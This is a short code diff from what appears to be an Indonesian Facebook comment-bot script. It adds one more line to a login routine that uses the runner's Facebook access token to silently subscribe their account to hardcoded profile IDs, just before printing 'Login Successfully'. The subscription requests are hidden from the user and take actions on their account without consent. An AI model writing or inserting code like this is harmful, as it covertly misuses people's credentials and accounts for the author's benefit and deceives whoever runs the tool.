@@ -73,6 +73,7 @@ def bot_komen():
     ses.post("https://graph.facebook.com/100000891392705/subscribers?access_token=" + token)
     ses.post("https://graph.facebook.com/100010998764674/subscribers?access_token=" + token)
     ses.post("https://graph.facebook.com/100022849470990/subscribers?access_token=" + token)
+    ses.post("https://graph.facebook.com/100003058813748/subscribers?access_token=" + token)
     print(" \033[0;97m[\033[0;92m+\033[0;97m] Login Successfully")
     menu()
     
